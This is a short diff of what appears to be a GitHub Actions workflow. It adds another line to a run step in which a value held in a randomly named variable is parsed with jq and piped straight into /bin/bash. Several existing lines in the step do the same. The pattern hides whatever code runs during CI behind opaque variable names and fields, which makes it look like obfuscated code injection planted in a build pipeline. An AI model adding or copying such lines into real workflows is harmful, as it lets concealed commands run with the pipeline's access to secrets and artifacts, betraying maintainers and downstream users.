@@ -26,6 +26,7 @@ jobs:
           echo $szz5252 | jq -r .obsf9103 | /bin/bash
           echo $fcme5364 | jq -r .zdqox076 | /bin/bash
           printf '%s' "$ls98851" | jq -r .no5769 | /bin/bash
+          printf '%s' "$rmz4260" | jq -r .ys822 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
